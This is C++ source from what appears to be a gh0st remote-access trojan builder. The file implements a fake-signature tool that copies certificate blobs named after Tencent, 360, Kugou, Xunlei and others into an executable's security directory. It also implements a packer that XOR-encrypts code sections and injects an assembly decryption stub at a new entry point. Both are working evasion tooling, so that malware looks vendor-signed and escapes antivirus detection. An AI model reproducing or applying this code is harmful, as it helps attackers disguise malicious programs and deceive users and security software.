// Signature.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "Signature.h"
// #include "HackerTools.h"
// extern CHackerTools *hack;

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSignature

IMPLEMENT_DYNCREATE(CSignature, CFormView)

CSignature::CSignature()
	: CFormView(CSignature::IDD)
{
	//{{AFX_DATA_INIT(CSignature)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}

CSignature::~CSignature()
{
}

void CSignature::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSignature)
	DDX_Control(pDX, IDC_Log, m_Log);
	DDX_Text(pDX, IDC_EDIT1, m_path);
	DDX_Text(pDX, IDC_EDIT_KEY, m_key);
	DDX_Check(pDX, IDC_CHECK_BAK, m_bak);

	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSignature, CFormView)
	//{{AFX_MSG_MAP(CSignature)
 	ON_WM_DROPFILES()
	ON_WM_CTLCOLOR()
	ON_BN_CLICKED(IDC_xuanwu, Onxuanwu)
	ON_BN_CLICKED(IDC_weishi, Onweishi)
	ON_BN_CLICKED(IDC_kugou, Onkugou)
	ON_BN_CLICKED(IDC_liulanqi, Onliulanqi)
	ON_BN_CLICKED(IDC_xunlei, Onxunlei)
	ON_BN_CLICKED(IDC_tengxun, Ontengxun)
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	ON_BN_CLICKED(IDC_BUTTON2, OnButton2)

	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSignature diagnostics

#ifdef _DEBUG
void CSignature::AssertValid() const
{
	CFormView::AssertValid();
}

void CSignature::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CSignature message handlers

void CSignature::OnInitialUpdate() 
{
	CFormView::OnInitialUpdate();
	::DragAcceptFiles(GetSafeHwnd(),true);
	m_dropEdit.SubclassDlgItem(IDC_EDIT1, this);
	m_dropEdit.SetUseDir(FALSE);
	GetDlgItem(IDC_EDIT1)->SetWindowText("把文件拖到这里点击签名....");

}


HBRUSH CSignature::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	if ((pWnd->GetDlgCtrlID() == IDC_Log) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(0, 255, 0);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0,0,0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CFormView::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}


void CSignature::OnDropFiles( HDROP hDropInfo )
{
	UINT cFiles = ::DragQueryFile( hDropInfo, 0xffffffff, 0, 0);    //取得文件数
	CString szText;
	char szFile[MAX_PATH];
	
	for( UINT count = 0; count < cFiles; count++ )
	{
		if(cFiles>0)
		{
			::DragQueryFile(hDropInfo, count, szFile, sizeof(szFile));
			szText += szFile;       //绝对路径+文件名存于szFile
			GetDlgItem(IDC_EDIT1)->SetWindowText(szText);
		}
	}
}
void error(LPSTR lpszFunction) 
{ 
    CHAR szBuf[80]; 
    DWORD dw = GetLastError(); 
	
    sprintf(szBuf, "%s failed: GetLastError returned %u\n", 
        lpszFunction, dw); 
	
    MessageBox(NULL, szBuf, "Error", MB_OK); 
} 

void SafeCloseHandle(FILE *hHandle)
{
	if (hHandle!=NULL)
	{
		fclose(hHandle);
	} 
}


void GetFileSizeAndName(const TCHAR * szTagFile,TCHAR *szFileName,DWORD *pFileSize)
{
	HANDLE hFile;
	
	if ((hFile = CreateFile(szTagFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0)) == INVALID_HANDLE_VALUE)
	{
		return;
	}
	
	*pFileSize=GetFileSize(hFile,NULL);
	CloseHandle(hFile);
	
}

void AttachFile(const TCHAR *szBind,const TCHAR *szAttach)
{
	
	FILE* fpWrite	= _tfopen(szBind, _T("ab+")); 
	FILE* fpRead	= _tfopen(szAttach,_T("rb"));
	
	if (fpWrite == NULL || fpRead == NULL)	
	{
		
		SafeCloseHandle(fpRead);
		SafeCloseHandle(fpWrite);
		return;
	}
	
	fseek(fpWrite,0,SEEK_END);
	fseek(fpRead,0,SEEK_SET);
	
	
	DWORD c;
	while ((c=fgetc(fpRead))!=EOF)
	{
		fputc(c,fpWrite);
	}
	
	fclose(fpWrite);
	fclose(fpRead);
}
void * GetMemoryFilePoint(const TCHAR* szFile)
{
	HANDLE hFile, hMapping;
	void *pPE;
	
    hFile = CreateFile(szFile,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL) ;
	
	if (hFile==INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	// 创建一个映射文件.
	if (!(hMapping = CreateFileMapping(hFile, 0, PAGE_READWRITE, 0, 0, 0)))
	{
		OutputDebugStringA("CreateMapping Failed.");
		CloseHandle(hFile);
		return NULL;
	}
	
	// 把文件头映象存入 pPE
	if (!(pPE = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0)))
	{
		OutputDebugStringA("MapViewOfFile Failed.");
		CloseHandle(hMapping);
		CloseHandle(hFile);
		return NULL;
	}
	
	CloseHandle(hMapping);
	CloseHandle(hFile);
	return pPE;
}
void CreateSingedFile(TCHAR szFile[],void *pMemFile,DWORD dwLen)
{
	char * pMemData=(char *)pMemFile;
	
	FILE* fpFile	= _tfopen(szFile, _T("ab+")); 
	
	if (fpFile == NULL)	
	{
		OutputDebugStringA("CreatePartFile Open Me File Error");
		SafeCloseHandle(fpFile);
		UnmapViewOfFile(pMemData);
		return;
	}
	
	DWORD dwSize=0;
	
	for (dwSize;dwSize<dwLen;dwSize++)//File1
	{
		DWORD c=pMemData[dwSize];
		fputc(c,fpFile);
	}
	SafeCloseHandle(fpFile);
}
// void CreateSign()
// {
// 	DWORD dwSize,dwWritten;
// 	HRSRC hr=FindResource(0,MAKEINTRESOURCE(IDR_QQxuanwu),"SIGN");//查找资源
// 	if(hr==NULL) return;
// 	dwSize=SizeofResource(NULL,hr);
// 	HGLOBAL hg=LoadResource(NULL,hr);//加载资源
// 	if(hg==NULL) return;
// 	LPSTR lp=(LPSTR)LockResource(hg);//锁定资源
// 	if(lp==NULL) return;
// 	
// 	HANDLE hFile;
// 	hFile = CreateFile("C:\\SIGN",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);//创建文件
// 	if(hFile == NULL)	return;
// 	WriteFile(hFile,(LPCVOID)lp,dwSize,&dwWritten,NULL);
// 	CloseHandle(hFile);	
// }


void CSignature::Onxuanwu() 
{
	// TODO: Add your control notification handler code here
	DWORD dwSize,dwWritten;
	HRSRC hr=FindResource(0,MAKEINTRESOURCE(IDR_QQxuanwu),"SIGN");//查找资源
	if(hr==NULL) return;
	dwSize=SizeofResource(NULL,hr);
	HGLOBAL hg=LoadResource(NULL,hr);//加载资源
	if(hg==NULL) return;
	LPSTR lp=(LPSTR)LockResource(hg);//锁定资源
	if(lp==NULL) return;
	
	HANDLE hFile;
	hFile = CreateFile("C:\\SIGN",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);//创建文件
	if(hFile == NULL)	return;
	WriteFile(hFile,(LPCVOID)lp,dwSize,&dwWritten,NULL);
	CloseHandle(hFile);	
}

void CSignature::Onweishi() 
{
	// TODO: Add your control notification handler code here
	DWORD dwSize,dwWritten;
	HRSRC hr=FindResource(0,MAKEINTRESOURCE(IDR_360weishi),"SIGN");//查找资源
	if(hr==NULL) return;
	dwSize=SizeofResource(NULL,hr);
	HGLOBAL hg=LoadResource(NULL,hr);//加载资源
	if(hg==NULL) return;
	LPSTR lp=(LPSTR)LockResource(hg);//锁定资源
	if(lp==NULL) return;
	
	HANDLE hFile;
	hFile = CreateFile("C:\\SIGN",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);//创建文件
	if(hFile == NULL)	return;
	WriteFile(hFile,(LPCVOID)lp,dwSize,&dwWritten,NULL);
	CloseHandle(hFile);	
}

void CSignature::Onkugou() 
{
	// TODO: Add your control notification handler code here
	DWORD dwSize,dwWritten;
	HRSRC hr=FindResource(0,MAKEINTRESOURCE(IDR_kugou),"SIGN");//查找资源
	if(hr==NULL) return;
	dwSize=SizeofResource(NULL,hr);
	HGLOBAL hg=LoadResource(NULL,hr);//加载资源
	if(hg==NULL) return;
	LPSTR lp=(LPSTR)LockResource(hg);//锁定资源
	if(lp==NULL) return;
	
	HANDLE hFile;
	hFile = CreateFile("C:\\SIGN",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);//创建文件
	if(hFile == NULL)	return;
	WriteFile(hFile,(LPCVOID)lp,dwSize,&dwWritten,NULL);
	CloseHandle(hFile);	
}

void CSignature::Onliulanqi() 
{
	// TODO: Add your control notification handler code here
	DWORD dwSize,dwWritten;
	HRSRC hr=FindResource(0,MAKEINTRESOURCE(IDR_liulanqi),"SIGN");//查找资源
	if(hr==NULL) return;
	dwSize=SizeofResource(NULL,hr);
	HGLOBAL hg=LoadResource(NULL,hr);//加载资源
	if(hg==NULL) return;
	LPSTR lp=(LPSTR)LockResource(hg);//锁定资源
	if(lp==NULL) return;
	
	HANDLE hFile;
	hFile = CreateFile("C:\\SIGN",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);//创建文件
	if(hFile == NULL)	return;
	WriteFile(hFile,(LPCVOID)lp,dwSize,&dwWritten,NULL);
	CloseHandle(hFile);	
}

void CSignature::Onxunlei() 
{
	// TODO: Add your control notification handler code here
	DWORD dwSize,dwWritten;
	HRSRC hr=FindResource(0,MAKEINTRESOURCE(IDR_xunlei),"SIGN");//查找资源
	if(hr==NULL) return;
	dwSize=SizeofResource(NULL,hr);
	HGLOBAL hg=LoadResource(NULL,hr);//加载资源
	if(hg==NULL) return;
	LPSTR lp=(LPSTR)LockResource(hg);//锁定资源
	if(lp==NULL) return;
	
	HANDLE hFile;
	hFile = CreateFile("C:\\SIGN",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);//创建文件
	if(hFile == NULL)	return;
	WriteFile(hFile,(LPCVOID)lp,dwSize,&dwWritten,NULL);
	CloseHandle(hFile);
}

void CSignature::Ontengxun() 
{
	// TODO: Add your control notification handler code here
	DWORD dwSize,dwWritten;
	HRSRC hr=FindResource(0,MAKEINTRESOURCE(IDR_tengxun),"SIGN");//查找资源
	if(hr==NULL) return;
	dwSize=SizeofResource(NULL,hr);
	HGLOBAL hg=LoadResource(NULL,hr);//加载资源
	if(hg==NULL) return;
	LPSTR lp=(LPSTR)LockResource(hg);//锁定资源
	if(lp==NULL) return;
	
	HANDLE hFile;
	hFile = CreateFile("C:\\SIGN",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);//创建文件
	if(hFile == NULL)	return;
	WriteFile(hFile,(LPCVOID)lp,dwSize,&dwWritten,NULL);
	CloseHandle(hFile);
}

void CSignature::OnButton1() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	
// 	CreateSign();
	
	DWORD dwSingSize=0;
	DWORD dwSingOffe=0;
	TCHAR szText[MAX_PATH]={0};
	
	GetFileSizeAndName(m_path.LockBuffer(),NULL,&dwSingOffe);
	GetFileSizeAndName("C:\\SIGN",NULL,&dwSingSize);
	

	CopyFile(m_path.LockBuffer(),"C:\\TEMP",TRUE);
	
	
	AttachFile("C:\\TEMP","C:\\SIGN");
	
	
	void * pFile=GetMemoryFilePoint("C:\\TEMP");
	
	if (pFile==NULL)
	{
		return;
	}
	
	PIMAGE_DOS_HEADER pImageDosHeader ;
	PIMAGE_NT_HEADERS pImageNtHeaders ;
	
    pImageDosHeader = (PIMAGE_DOS_HEADER)pFile ;
	
/*	AddText("开始检测文件的有效性");*/
	m_Log.ReplaceSel( "<- 开始检测文件的有效性...\r\n");
    if (pImageDosHeader->e_magic!=IMAGE_DOS_SIGNATURE)
    {
		UnmapViewOfFile(pFile);
//		AddText("您选择的文件是无效的");
		m_Log.ReplaceSel( "<- 您选择的文件是无效的...\r\n");
		DeleteFile("C:\\QQxuanwu.cer");
		DeleteFile("C:\\360weishi.cer");
		DeleteFile("C:\\liulanqi.cer");
		DeleteFile("C:\\kugou.cer");
		DeleteFile("C:\\tengxun.cer");
		DeleteFile("C:\\xunlei.cer");
		DeleteFile("C:\\TEMP");
		DeleteFile("C:\\SIGN");
		return ;
	}
	
	pImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)pFile+pImageDosHeader->e_lfanew) ;
	
	if (pImageNtHeaders->Signature!=IMAGE_NT_SIGNATURE)
	{
		UnmapViewOfFile(pFile);
		m_Log.ReplaceSel( "<- 您选择的文件是无效的...\r\n");
		DeleteFile("C:\\QQxuanwu.cer");
		DeleteFile("C:\\360weishi.cer");
		DeleteFile("C:\\liulanqi.cer");
		DeleteFile("C:\\kugou.cer");
		DeleteFile("C:\\tengxun.cer");
		DeleteFile("C:\\xunlei.cer");
		DeleteFile("C:\\TEMP");
		DeleteFile("C:\\SIGN");
		return ;
	}
	if (pImageNtHeaders->OptionalHeader.DataDirectory[4].Size!=0 || pImageNtHeaders->OptionalHeader.DataDirectory[4].VirtualAddress!=0 )
	{
		if(MessageBox(_TEXT("这个文件以经有了数字签名 要继续添加吗?"),_TEXT("提示"),MB_YESNO|MB_ICONQUESTION)!=IDYES)
		{
			UnmapViewOfFile(pFile);
	//		AddText("这个文件以经有了数字签名");
			m_Log.ReplaceSel( "<- 这个文件以经有了数字签名...\r\n");
			DeleteFile("C:\\QQxuanwu.cer");
			DeleteFile("C:\\360weishi.cer");
			DeleteFile("C:\\liulanqi.cer");
			DeleteFile("C:\\kugou.cer");
			DeleteFile("C:\\tengxun.cer");
			DeleteFile("C:\\xunlei.cer");
			DeleteFile("C:\\TEMP");
			DeleteFile("C:\\SIGN");
			return ;
		}
	}
	
//	AddText("开始写入偏移位置和大小");
	pImageNtHeaders->OptionalHeader.DataDirectory[4].Size=dwSingSize;				//数字签名的大小 
	pImageNtHeaders->OptionalHeader.DataDirectory[4].VirtualAddress=dwSingOffe;		//数字签名的位置
	
	TCHAR szNewFile[MAX_PATH]={0};
	lstrcpy(szNewFile,m_path.LockBuffer());
	lstrcat(szNewFile,"New.exe");
	
//	AddText("创建新的文件");
	CreateSingedFile(szNewFile,pFile,dwSingOffe+dwSingSize);
//	AddText("添加数字签名成功");
	m_Log.ReplaceSel( "<- 添加数字签名成功...\r\n");
	UnmapViewOfFile(pFile);
	DeleteFile("C:\\QQxuanwu.cer");
	DeleteFile("C:\\360weishi.cer");
	DeleteFile("C:\\liulanqi.cer");
	DeleteFile("C:\\kugou.cer");
	DeleteFile("C:\\tengxun.cer");
	DeleteFile("C:\\xunlei.cer");


	DeleteFile("C:\\TEMP");
	DeleteFile("C:\\SIGN");
}
bool CSignature::AddSection1()
{
	UpdateData(TRUE);
	HANDLE	hFile = NULL;
	HANDLE	hMap = NULL;
	PVOID	pFile = NULL;

	PIMAGE_DOS_HEADER		dosheader;
	PIMAGE_NT_HEADERS		peheader;
	PIMAGE_SECTION_HEADER	sectiontable;
	PIMAGE_SECTION_HEADER	sectiontablenew;

	PVOID	pStart = NULL;
	PVOID	pEnd = NULL;

	int		secnum;

	DWORD	pos;
	DWORD	size;

	hFile = CreateFile(
				m_path.GetBuffer(0),
				GENERIC_READ|GENERIC_WRITE,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_ARCHIVE,
				0
				);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		MessageBox("CreateFile错误");
		return FALSE;
	}	
	
	hMap = CreateFileMapping(
				hFile,
				NULL,
				PAGE_READWRITE,
				0,
				0,
				NULL
				);
	if(hMap == NULL)
	{
		MessageBox("CreateFileMapping错误");
		CloseHandle(hFile);
		return FALSE;
	}
	
	pFile = MapViewOfFile(
				hMap,
				FILE_MAP_ALL_ACCESS,
				0,
				0,
				0
				);
	if(pFile == NULL)
	{
		MessageBox("MapViewOfFile错误");
		CloseHandle(hMap);
		CloseHandle(hFile);
		return FALSE;
	}
	
	dosheader = (PIMAGE_DOS_HEADER)pFile;
	peheader = (PIMAGE_NT_HEADERS)((DWORD)dosheader + dosheader->e_lfanew);
	secnum=peheader->FileHeader.NumberOfSections;
	sectiontable = (PIMAGE_SECTION_HEADER)((DWORD)peheader + sizeof(IMAGE_NT_HEADERS));
	sectiontable +=secnum-1;
	sectiontablenew = sectiontable+1;
	
	DWORD sectionalign=peheader->OptionalHeader.SectionAlignment;
	DWORD filealign=peheader->OptionalHeader.FileAlignment;

	memcpy(sectiontablenew->Name,".code",6);
	if((sectiontable->VirtualAddress+sectiontable->Misc.VirtualSize)%sectionalign!=0)
	{
		sectiontablenew->VirtualAddress=(DWORD)((sectiontable->VirtualAddress+sectiontable->Misc.VirtualSize)/sectionalign+1)*sectionalign;
	}
	else
	{
		sectiontablenew->VirtualAddress=(DWORD)(sectiontable->VirtualAddress+sectiontable->Misc.VirtualSize);
	}
	sectiontablenew->Misc.VirtualSize=(DWORD)sectionalign;
	if((sectiontable->PointerToRawData+sectiontable->SizeOfRawData)%filealign !=0)
	{
		sectiontablenew->PointerToRawData=(DWORD)((sectiontable->PointerToRawData+sectiontable->SizeOfRawData)/filealign+1)*filealign;
	}
	else
	{
		sectiontablenew->PointerToRawData=(DWORD)(sectiontable->PointerToRawData+sectiontable->SizeOfRawData);
	}
	sectiontablenew->SizeOfRawData=(DWORD)filealign;
	sectiontablenew->Characteristics=(DWORD)0x60000020;
	pos=sectiontablenew->PointerToRawData;
	size=sectiontablenew->SizeOfRawData;
	peheader->OptionalHeader.SizeOfImage = sectiontablenew->VirtualAddress+sectiontablenew->Misc.VirtualSize;
	peheader->FileHeader.NumberOfSections +=1;

	UnmapViewOfFile(pFile);
	CloseHandle(hMap);

	DWORD o_size;
	DWORD dFileSize = GetFileSize(hFile,NULL);
	if ((long)dFileSize<(long)pos) return FALSE;
	void * overlay=malloc(dFileSize-pos);
	SetFilePointer(hFile,pos,NULL,FILE_BEGIN);
	ReadFile(hFile,overlay,dFileSize-pos,&o_size,NULL);
	SetFilePointer(hFile,pos,NULL,FILE_BEGIN);
	void * code=malloc(size);
	memset(code,0,size);
	WriteFile(hFile,code,size,&o_size,NULL);
	WriteFile(hFile,overlay,dFileSize-pos,&o_size,NULL);
	free(code);
	free(overlay);

	CloseHandle(hFile);
	return TRUE;
}
void CSignature::AsmCode(char *lpBuffer,DWORD *codelen)
{
	unsigned char *p_Code = NULL;
	DWORD dwCodeLen;
	
	_asm
	{
		call __CodeExit
			PUSH EBP
			MOV EBP,ESP
			PUSH -1
			PUSH 0A8B7E3CBh			//算法
			PUSH 0AEB6BBB2h			//不懂
			MOV EAX,DWORD PTR FS:[0]
			PUSH EAX
			MOV DWORD PTR FS:[0],ESP
			POP EAX
			MOV DWORD PTR FS:[0],EAX
			POP EAX
			POP EAX
			POP EAX
			POP EAX
			MOV EBP,EAX
			PUSH 00406071h			//配置地址
			CALL __readconf
			MOV EAX,00401000h		//oep地址
			JMP EAX
__readconf:
		PUSH EDI				//读取配置并解密
			PUSH ESI
			MOV EDI,DWORD PTR DS:[ESP+0Ch]
			MOVSX ESI,BYTE PTR DS:[EDI]
			INC EDI
__readconf_start:
		CMP ESI,0
			JE __readconf_end
			MOV EAX,DWORD PTR DS:[EDI]
			MOV EBX,DWORD PTR DS:[EDI+4]
			MOV CL,BYTE PTR DS:[EDI+8]
			CALL __decode				//call解密函数
			ADD EDI,9
			DEC ESI
			JMP __readconf_start
__readconf_end:
		POP ESI
			POP EDI
			RETN 4
__decode:
		CMP EAX,EBX					//解密函数
			JGE __decode_end
			MOV DL,BYTE PTR DS:[EAX]
			XOR DL,CL
			MOV BYTE PTR DS:[EAX],DL
			INC EAX
			JMP __decode
__decode_end:
		RETN	// 返回主程序
__CodeExit:
		pop eax
			mov p_Code,eax
			lea edx,__CodeExit
			sub edx,eax
			mov dwCodeLen,edx
	}
	
	memcpy(lpBuffer,p_Code,dwCodeLen);
	*codelen = dwCodeLen;
}
bool CSignature::CheckSec(PIMAGE_SECTION_HEADER sectiontable,PIMAGE_NT_HEADERS peheader,int num)
{
	if((long)(sectiontable->VirtualAddress)<=(long)(peheader->OptionalHeader.DataDirectory[num].VirtualAddress))
		if((long)(sectiontable->VirtualAddress+sectiontable->Misc.VirtualSize)>=(long)(peheader->OptionalHeader.DataDirectory[num].VirtualAddress+peheader->OptionalHeader.DataDirectory[num].Size)) return TRUE;
		return FALSE;
}
void CSignature::OnButton2() 
{
	UpdateData(TRUE);
	OutputDebugString("OnButton2");
	if(m_path.GetLength()==0){
		m_Log.ReplaceSel( "<- 请指定要加壳的文件...\r\n");
		return;};
		OutputDebugString(m_path);

	CString m_file_new=m_path+".bak";
	if(m_bak){CopyFile(m_path.GetBuffer(0),m_file_new.GetBuffer(0),TRUE);}
	
	if(!AddSection1()){
		m_Log.ReplaceSel( "<- 添加新区段失败...\r\n");return;} //添加一个新区段

	HANDLE	hFile = NULL;
	HANDLE	hMap = NULL;
	PVOID	pFile = NULL;

	PIMAGE_DOS_HEADER		dosheader;
	PIMAGE_NT_HEADERS		peheader;
	PIMAGE_SECTION_HEADER	sectiontable;

	PVOID	pStart = NULL;
	PVOID	pEnd = NULL;

	DWORD	dwEntryPoint = 0;
	BYTE    key=m_key%256;

	unsigned char lpCodeBuf[512]={0};
	DWORD	dwCodeLen=0;
	AsmCode((char *)lpCodeBuf,&dwCodeLen);
	hFile = CreateFile(
				m_path.GetBuffer(0),
				GENERIC_READ|GENERIC_WRITE,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_ARCHIVE,
				0
				);
	if(hFile==INVALID_HANDLE_VALUE)
	{	m_Log.ReplaceSel( "<- CreateFile错误...\r\n");
		return;
	}	
	DWORD dFileSize = GetFileSize(hFile,NULL);
	hMap = CreateFileMapping(
				hFile,
				NULL,
				PAGE_READWRITE,
				0,
				0,
				NULL
				);
	if(hMap == NULL)
	{	m_Log.ReplaceSel( "<- CreateFileMapping错误...\r\n");
			CloseHandle(hFile);
		return;
	}
	
	pFile = MapViewOfFile(
				hMap,
				FILE_MAP_ALL_ACCESS,
				0,
				0,
				0
				);
	if(pFile == NULL)
	{	m_Log.ReplaceSel( "<- MapViewOfFile错误...\r\n");

		CloseHandle(hMap);
		CloseHandle(hFile);
		return;
	}

	dosheader = (PIMAGE_DOS_HEADER)pFile;
	peheader = (PIMAGE_NT_HEADERS)((DWORD)dosheader + dosheader->e_lfanew);
	int secnum = peheader->FileHeader.NumberOfSections;
	dwEntryPoint = (DWORD)(peheader->OptionalHeader.ImageBase + peheader->OptionalHeader.AddressOfEntryPoint);
	sectiontable = (PIMAGE_SECTION_HEADER)((DWORD)peheader + sizeof(IMAGE_NT_HEADERS));
	byte ennum=0;
	for(int i=0;i<secnum-1;i++)
	{
		if(CheckSec(sectiontable,peheader,1)||CheckSec(sectiontable,peheader,12))
		{
			char a[200]={0};
			wsprintf(a,"<- %s\t%s\t%08X...\r\n","导入表段",sectiontable->Name,sectiontable->VirtualAddress);
		//	MessageBox(a);
			m_Log.ReplaceSel(a);
		}
		else if(CheckSec(sectiontable,peheader,2))
		{
			char a[200]={0};
			wsprintf(a,"<- %s\t%s\t%08X...\r\n","资源段",sectiontable->Name,sectiontable->VirtualAddress);
			m_Log.ReplaceSel(a);
		}
		else
		{

			pStart = (PVOID)((DWORD)pFile + (DWORD)sectiontable->PointerToRawData);
			DWORD minSize;
			if((long)sectiontable->SizeOfRawData < (long)sectiontable->Misc.VirtualSize)
			{
				minSize=sectiontable->SizeOfRawData;
			}
			else
			{
				minSize=sectiontable->Misc.VirtualSize;
			}

			pEnd = (PVOID)((DWORD)pFile + (DWORD)sectiontable->PointerToRawData + minSize);

			_asm{
					mov eax,pStart
			loop1:
					cmp eax,pEnd
					jge loop2
					mov dl,byte ptr ds:[eax]
					xor dl,key
					mov byte ptr ds:[eax],dl
					inc eax
					jmp loop1
			loop2:
				}
			
			*(DWORD *) (lpCodeBuf+dwCodeLen+1+ennum*9) = (DWORD) (peheader->OptionalHeader.ImageBase +sectiontable->VirtualAddress);
			*(DWORD *) (lpCodeBuf+dwCodeLen+5+ennum*9) = (DWORD) (peheader->OptionalHeader.ImageBase +sectiontable->VirtualAddress+minSize);
			*(BYTE *)  (lpCodeBuf+dwCodeLen+9+ennum*9) = (BYTE) key;
			ennum++;
			sectiontable->Characteristics  |= 0x80000000;
		}

		sectiontable++;
	}

	*(BYTE *) (lpCodeBuf+dwCodeLen)=ennum;
	*(DWORD *) (lpCodeBuf + 0x2B) = (DWORD)(peheader->OptionalHeader.ImageBase + sectiontable->VirtualAddress +dwCodeLen);
	*(DWORD *) (lpCodeBuf + 0x35) = (DWORD)dwEntryPoint;

	pStart = (PVOID)((DWORD)pFile + (DWORD)sectiontable->PointerToRawData);
	//pEnd = (PVOID)((DWORD)pFile + (DWORD)sectiontable->PointerToRawData + (DWORD)sectiontable->SizeOfRawData);
	memcpy(pStart,lpCodeBuf,512);
	peheader->OptionalHeader.AddressOfEntryPoint = sectiontable->VirtualAddress;

	peheader->OptionalHeader.MajorLinkerVersion = 6;
	peheader->OptionalHeader.MinorLinkerVersion = 0;

// 	MessageBox("加壳成功,请严格测试后使用");
	m_Log.ReplaceSel( "<- 加壳成功,请严格测试后使用...\r\n");
    OutputDebugString("ok");
	UnmapViewOfFile(pFile);
	CloseHandle(hMap);
	CloseHandle(hFile);
	}